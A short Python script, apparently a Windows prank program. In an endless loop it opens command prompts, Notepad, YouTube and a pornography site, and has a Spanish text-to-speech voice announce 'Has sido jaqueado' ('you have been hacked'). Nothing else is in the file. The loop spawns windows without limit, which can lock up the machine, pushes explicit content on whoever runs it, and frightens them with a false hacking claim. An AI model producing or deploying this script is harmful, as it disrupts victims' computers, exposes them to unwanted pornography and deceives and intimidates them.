import pyttsx3 as talk
engine = talk.init()
engine.setProperty('voice', '''HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Speech\Voices\Tokens\TTS_MS_ES-ES_HELENA_11.0''')
import os
def func():
    os.system("start cmd")
    os.system('start notepad')
    os.system('start www.youtube.com')
    os.system('start www.pornhub.com')
def mensaje():
    engine.say('Has sido jaqueado')
    engine.runAndWait()
while True:
    func()
    mensaje()